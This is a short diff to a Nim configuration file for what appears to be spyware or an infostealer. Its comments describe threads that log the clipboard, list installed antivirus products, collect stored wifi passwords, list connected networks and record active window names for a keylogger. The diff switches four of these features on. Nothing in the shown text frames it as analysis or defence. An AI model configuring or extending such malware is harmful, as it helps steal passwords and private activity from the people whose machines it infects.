@@ -37,7 +37,7 @@ const USE_PERSISTENCE_THREAD*: bool = false
 ## clipboardThread is used for logging the clipboard
 ## every time it changes
 ## DEFAULT: true
-const USE_CLIPBOARD_THREAD*: bool = false
+const USE_CLIPBOARD_THREAD*: bool = true
 
 ## run clipboardThread every n ms
 ## higher value: lower cpu usage, higher chance of not reflecting all data changes
@@ -48,17 +48,17 @@ const CLIPBOARD_THREAD_CHECK_INTERVAL*: int = 100
 ## getAVSThread is used for getting
 ## all the installed antivirus software on the user's pc
 ## DEFAULT: true
-const USE_GET_AVS_THREAD*: bool = false
+const USE_GET_AVS_THREAD*: bool = true
 
 ## wifiPasswordsThread is used for getting
 ## all the wifi passwords stored on user's pc
 ## DEFAULT: true
-const USE_WIFI_PASSWORDS_THREAD*: bool = false
+const USE_WIFI_PASSWORDS_THREAD*: bool = true
 
 ## connectedWifiThread is used for getting
 ## all the networks the user is connected to
 ## DEFAULT: true
-const USE_CONNECTED_WIFI_THREAD*: bool = false
+const USE_CONNECTED_WIFI_THREAD*: bool = true
 
 ## windowNameThread is used for getting the active window name
 ## best used alongside keyloggerThread
